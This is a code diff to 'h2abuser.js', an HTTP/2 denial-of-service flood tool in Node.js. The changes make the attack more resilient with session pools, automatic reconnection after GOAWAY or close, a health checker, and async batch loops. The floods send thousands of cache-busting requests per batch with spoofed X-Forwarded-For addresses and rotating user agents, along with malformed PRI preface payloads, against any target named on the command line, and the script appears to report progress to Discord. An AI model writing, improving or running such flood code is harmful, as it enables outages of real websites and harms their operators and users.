@@ -17,9 +17,13 @@ class H2Abuser {
         this.lastResponse = "NO RESPONSE YET";
         this.lastResponseTime = 0;
         
-        // Connection pools
+        // Connection pools with health tracking
         this.df17Sessions = [];
         this.loongSessions = [];
+        this.sessionLocks = {
+            df17: [],
+            loong: []
+        };
         
         // User agents
         this.samsungUAs = [
@@ -42,18 +46,86 @@ class H2Abuser {
         this.setupConnections();
     }
     
+    createSession(type) {
+        try {
+            const session = http2.connect(`https://${this.target}`, {
+                maxSessionMemory: 100,
+                maxReservedRemoteStreams: 20000,
+                maxConcurrentStreams: 1000
+            });
+            
+            session.setMaxListeners(100);
+            session.on('error', (err) => {
+                // Session error - will be replaced
+            });
+            
+            session.on('goaway', () => {
+                // Mark for replacement
+                setTimeout(() => this.replaceSession(session, type), 100);
+            });
+            
+            session.on('close', () => {
+                // Mark for replacement
+                setTimeout(() => this.replaceSession(session, type), 100);
+            });
+            
+            return session;
+        } catch (err) {
+            return null;
+        }
+    }
+    
+    replaceSession(oldSession, type) {
+        const sessions = type === 'df17' ? this.df17Sessions : this.loongSessions;
+        const locks = type === 'df17' ? this.sessionLocks.df17 : this.sessionLocks.loong;
+        
+        const index = sessions.indexOf(oldSession);
+        if (index !== -1) {
+            try { oldSession.destroy(); } catch {}
+            
+            // Create new session
+            const newSession = this.createSession(type);
+            if (newSession) {
+                sessions[index] = newSession;
+            }
+        }
+    }
+    
     setupConnections() {
         // Create 3 H2 connections for each type
         for (let i = 0; i < 3; i++) {
-            const df17Session = http2.connect(`https://${this.target}`);
-            df17Session.setMaxListeners(100);
-            df17Session.on('error', () => {});
-            this.df17Sessions.push(df17Session);
+            const df17Session = this.createSession('df17');
+            if (df17Session) this.df17Sessions.push(df17Session);
             
-            const loongSession = http2.connect(`https://${this.target}`);
-            loongSession.setMaxListeners(100);
-            loongSession.on('error', () => {});
-            this.loongSessions.push(loongSession);
+            const loongSession = this.createSession('loong');
+            if (loongSession) this.loongSessions.push(loongSession);
+            
+            // Initialize locks
+            this.sessionLocks.df17.push(false);
+            this.sessionLocks.loong.push(false);
+        }
+    }
+    
+    getAvailableSession(type) {
+        const sessions = type === 'df17' ? this.df17Sessions : this.loongSessions;
+        const locks = type === 'df17' ? this.sessionLocks.df17 : this.sessionLocks.loong;
+        
+        // Find unlocked session
+        for (let i = 0; i < sessions.length; i++) {
+            if (!locks[i] && sessions[i] && !sessions[i].destroyed) {
+                locks[i] = true;
+                return { session: sessions[i], index: i };
+            }
+        }
+        
+        // All locked, wait and retry (return null, will be retried)
+        return null;
+    }
+    
+    releaseSession(index, type) {
+        const locks = type === 'df17' ? this.sessionLocks.df17 : this.sessionLocks.loong;
+        if (index !== undefined) {
+            locks[index] = false;
         }
     }
     
@@ -66,151 +138,181 @@ class H2Abuser {
     }
     
     // DF-17 Payload (Cache Buster)
-    df17Request() {
-        const session = this.df17Sessions[Math.floor(Math.random() * this.df17Sessions.length)];
-        const cacheBuster = Math.floor(Date.now() / 1000);
-        const ip = this.randomIP();
-        const ua = this.randomUA();
+    async df17Request() {
+        const sessionInfo = this.getAvailableSession('df17');
+        if (!sessionInfo) {
+            // Queue for retry
+            setTimeout(() => this.df17Request(), 10);
+            return;
+        }
         
-        const headers = {
-            ':method': 'GET',
-            ':path': `/?cache_buster=${cacheBuster}`,
-            ':authority': this.target,
-            'user-agent': ua,
-            'accept-language': 'en-US,en;q=0.9',
-            'accept-encoding': 'gzip, deflate, br',
-            'cache-control': 'no-cache, no-store, must-revalidate',
-            'pragma': 'no-cache',
-            'x-forwarded-for': ip
-        };
+        const { session, index } = sessionInfo;
         
-        const start = performance.now();
-        const req = session.request(headers);
-        
-        let responseData = '';
-        
-        req.on('response', (headers) => {
-            this.df17Hit++;
-            this.lastResponseTime = Math.round(performance.now() - start);
-        });
-        
-        req.on('data', (chunk) => {
-            responseData += chunk.toString('utf8').slice(0, 200);
-            if (responseData.length > 500) {
-                this.lastResponse = responseData.slice(0, 500);
-            }
-        });
-        
-        req.on('end', () => {
-            if (responseData) {
-                this.lastResponse = responseData.slice(0, 500).replace(/\n/g, ' ').replace(/\r/g, '');
-            }
-        });
-        
-        req.on('error', () => {
+        try {
+            const cacheBuster = Math.floor(Date.now() / 1000);
+            const ip = this.randomIP();
+            const ua = this.randomUA();
+            
+            const headers = {
+                ':method': 'GET',
+                ':path': `/?cache_buster=${cacheBuster}`,
+                ':authority': this.target,
+                'user-agent': ua,
+                'accept-language': 'en-US,en;q=0.9',
+                'accept-encoding': 'gzip, deflate, br',
+                'cache-control': 'no-cache, no-store, must-revalidate',
+                'pragma': 'no-cache',
+                'x-forwarded-for': ip
+            };
+            
+            const start = performance.now();
+            const req = session.request(headers);
+            
+            let responseData = '';
+            
+            req.on('response', () => {
+                this.df17Hit++;
+                this.lastResponseTime = Math.round(performance.now() - start);
+            });
+            
+            req.on('data', (chunk) => {
+                responseData += chunk.toString('utf8').slice(0, 200);
+                if (responseData.length > 500) {
+                    this.lastResponse = responseData.slice(0, 500);
+                }
+            });
+            
+            req.on('end', () => {
+                if (responseData) {
+                    this.lastResponse = responseData.slice(0, 500).replace(/\n/g, ' ').replace(/\r/g, '');
+                }
+                this.releaseSession(index, 'df17');
+            });
+            
+            req.on('error', () => {
+                this.destroyedReqs++;
+                this.releaseSession(index, 'df17');
+            });
+            
+            req.end();
+            this.df17Sent++;
+            
+            // Timeout protection
+            setTimeout(() => {
+                if (!req.destroyed) {
+                    req.destroy();
+                    this.releaseSession(index, 'df17');
+                }
+            }, 5000);
+            
+        } catch (err) {
             this.destroyedReqs++;
-        });
-        
-        req.end();
-        this.df17Sent++;
-        
-        // Clean up
-        setTimeout(() => {
-            req.destroy();
-        }, 5000);
+            this.releaseSession(index, 'df17');
+        }
     }
     
     // Loong II Payload (PRI Flood)
-    loongRequest() {
-        const session = this.loongSessions[Math.floor(Math.random() * this.loongSessions.length)];
+    async loongRequest() {
+        const sessionInfo = this.getAvailableSession('loong');
+        if (!sessionInfo) {
+            // Queue for retry
+            setTimeout(() => this.loongRequest(), 10);
+            return;
+        }
         
-        // Special PRI payload for HTTP/2
-        const priPayload = Buffer.from('PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n', 'ascii');
+        const { session, index } = sessionInfo;
         
-        const headers = {
-            ':method': 'GET',
-            ':path': '/',
-            ':authority': this.target
-        };
-        
-        const req = session.request(headers);
-        
-        // Send raw PRI data (simulate connection preface)
         try {
-            req.write(priPayload);
-        } catch {}
-        
-        req.on('response', () => {
-            this.loongHit++;
-        });
-        
-        req.on('error', () => {
+            const headers = {
+                ':method': 'GET',
+                ':path': '/',
+                ':authority': this.target
+            };
+            
+            const req = session.request(headers);
+            
+            // Send PRI payload (malformed)
+            try {
+                const priPayload = Buffer.from('PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n', 'ascii');
+                req.write(priPayload);
+            } catch {}
+            
+            req.on('response', () => {
+                this.loongHit++;
+            });
+            
+            req.on('end', () => {
+                this.releaseSession(index, 'loong');
+            });
+            
+            req.on('error', () => {
+                this.destroyedReqs++;
+                this.releaseSession(index, 'loong');
+            });
+            
+            // End quickly
+            setTimeout(() => {
+                if (!req.destroyed) {
+                    req.end();
+                }
+            }, 10);
+            
+            this.loongSent++;
+            
+            // Timeout protection
+            setTimeout(() => {
+                if (!req.destroyed) {
+                    req.destroy();
+                    this.releaseSession(index, 'loong');
+                }
+            }, 2000);
+            
+        } catch (err) {
             this.destroyedReqs++;
-        });
-        
-        setTimeout(() => {
-            req.end();
-        }, 10);
-        
-        this.loongSent++;
-        
-        // Clean up
-        setTimeout(() => {
-            req.destroy();
-        }, 1000);
+            this.releaseSession(index, 'loong');
+        }
     }
     
-    // DF-17 Batch: 1000-1700 reqs, no delay between them
-    df17Batch() {
-        const count = Math.floor(Math.random() * 701) + 1000; // 1000-1700
+    // DF-17 Batch: 1000-1700 reqs, no delay
+    async df17Batch() {
+        const count = Math.floor(Math.random() * 701) + 1000;
+        const promises = [];
         
         for (let i = 0; i < count; i++) {
             if (!this.running) break;
-            this.df17Request();
+            promises.push(this.df17Request());
         }
         
-        console.log(`\x1b[36m[DF-17] Batch sent: ${count} reqs\x1b[0m`);
+        await Promise.all(promises);
+        console.log(`\x1b[36m[DF-17] Batch complete: ${count} reqs\x1b[0m`);
     }
     
-    // Loong II Batch: 4000-7000 reqs, 50ms delay between each
-    loongBatch() {
-        const count = Math.floor(Math.random() * 3001) + 4000; // 4000-7000
+    // Loong II Batch: 4000-7000 reqs, 50ms delay
+    async loongBatch() {
+        const count = Math.floor(Math.random() * 3001) + 4000;
         
-        let sent = 0;
-        const sendNext = () => {
-            if (!this.running || sent >= count) return;
-            
-            this.loongRequest();
-            sent++;
-            
-            if (sent < count) {
-                setTimeout(sendNext, 50); // 50ms delay
-            }
-        };
+        for (let i = 0; i < count; i++) {
+            if (!this.running) break;
+            await this.loongRequest();
+            await new Promise(resolve => setTimeout(resolve, 50));
+        }
         
-        sendNext();
-        console.log(`\x1b[31m[Loong II] Batch started: ${count} reqs (50ms delay)\x1b[0m`);
+        console.log(`\x1b[31m[Loong II] Batch complete: ${count} reqs\x1b[0m`);
     }
     
     // Main attack loops
-    startDF17() {
-        const runBatch = () => {
-            if (!this.running) return;
-            this.df17Batch();
-            const nextDelay = Math.floor(Math.random() * 2000) + 1000; // 1-3s
-            setTimeout(runBatch, nextDelay);
-        };
-        runBatch();
+    async startDF17() {
+        while (this.running) {
+            await this.df17Batch();
+            await new Promise(resolve => setTimeout(resolve, Math.floor(Math.random() * 2000) + 1000));
+        }
     }
     
-    startLoong() {
-        const runBatch = () => {
-            if (!this.running) return;
-            this.loongBatch();
-            const nextDelay = Math.floor(Math.random() * 1000) + 2000; // 2-3s
-            setTimeout(runBatch, nextDelay);
-        };
-        runBatch();
+    async startLoong() {
+        while (this.running) {
+            await this.loongBatch();
+            await new Promise(resolve => setTimeout(resolve, Math.floor(Math.random() * 1000) + 2000));
+        }
     }
     
     // Terminal logging
@@ -279,71 +381,50 @@ class H2Abuser {
                 }
             };
             
-            const req = https.request(options, (res) => {
-                res.on('data', () => {});
-            });
-            
+            const req = https.request(options);
             req.on('error', () => {});
             req.write(data);
             req.end();
             
-            setTimeout(sendUpdate, 30000); // 30s
+            setTimeout(sendUpdate, 30000);
         };
         
         sendUpdate();
     }
     
-    // Memory management
-    cleanup() {
+    // Session health checker
+    healthCheck() {
         setInterval(() => {
-            if (global.gc) {
-                global.gc();
-            }
-            
-            // Force close dead sessions
-            const now = Date.now();
-            this.df17Sessions = this.df17Sessions.filter(s => {
-                if (!s.socket || s.socket.destroyed) {
-                    try { s.destroy(); } catch {}
-                    return false;
+            ['df17', 'loong'].forEach(type => {
+                const sessions = type === 'df17' ? this.df17Sessions : this.loongSessions;
+                
+                for (let i = 0; i < sessions.length; i++) {
+                    const session = sessions[i];
+                    if (!session || session.destroyed) {
+                        // Replace dead session
+                        const newSession = this.createSession(type);
+                        if (newSession) {
+                            sessions[i] = newSession;
+                        }
+                    }
                 }
-                return true;
             });
             
-            this.loongSessions = this.loongSessions.filter(s => {
-                if (!s.socket || s.socket.destroyed) {
-                    try { s.destroy(); } catch {}
-                    return false;
-                }
-                return true;
-            });
-            
-            // Add new sessions if needed
-            while (this.df17Sessions.length < 3) {
-                const s = http2.connect(`https://${this.target}`);
-                s.setMaxListeners(100);
-                s.on('error', () => {});
-                this.df17Sessions.push(s);
-            }
-            
-            while (this.loongSessions.length < 3) {
-                const s = http2.connect(`https://${this.target}`);
-                s.setMaxListeners(100);
-                s.on('error', () => {});
-                this.loongSessions.push(s);
-            }
-        }, 30000);
+            if (global.gc) global.gc();
+        }, 10000);
     }
     
     start() {
         console.log(`\x1b[32m[H2 ABUSER] Attack started on ${this.target} for ${this.duration/1000}s\x1b[0m`);
         
+        // Start everything
         this.startDF17();
         this.startLoong();
         this.terminalLog();
         this.discordLog();
-        this.cleanup();
+        this.healthCheck();
         
+        // Stop after duration
         setTimeout(() => {
             this.running = false;
             console.log(`\n\x1b[32m[H2 ABUSER] Attack finished\x1b[0m`);
@@ -353,7 +434,7 @@ class H2Abuser {
             
             // Close all sessions
             [...this.df17Sessions, ...this.loongSessions].forEach(s => {
-                try { s.destroy(); } catch {}
+                try { if (!s.destroyed) s.destroy(); } catch {}
             });
             
             process.exit(0);
@@ -361,7 +442,7 @@ class H2Abuser {
     }
 }
 
-// Run with GC enabled
+// Run
 if (require.main === module) {
     const target = process.argv[2];
     const duration = parseInt(process.argv[3]) || 300;
@@ -370,13 +451,6 @@ if (require.main === module) {
         console.log('Usage: node h2abuser.js <target> [duration]');
         console.log('Example: node h2abuser.js example.com 300');
         process.exit(1);
-    }
-    
-    // Enable garbage collection
-    if (global.gc) {
-        console.log('\x1b[33m[GC] Enabled\x1b[0m');
-    } else {
-        console.log('\x1b[33m[GC] Run with --expose-gc flag for better memory management\x1b[0m');
     }
     
     const abuser = new H2Abuser(target, duration);
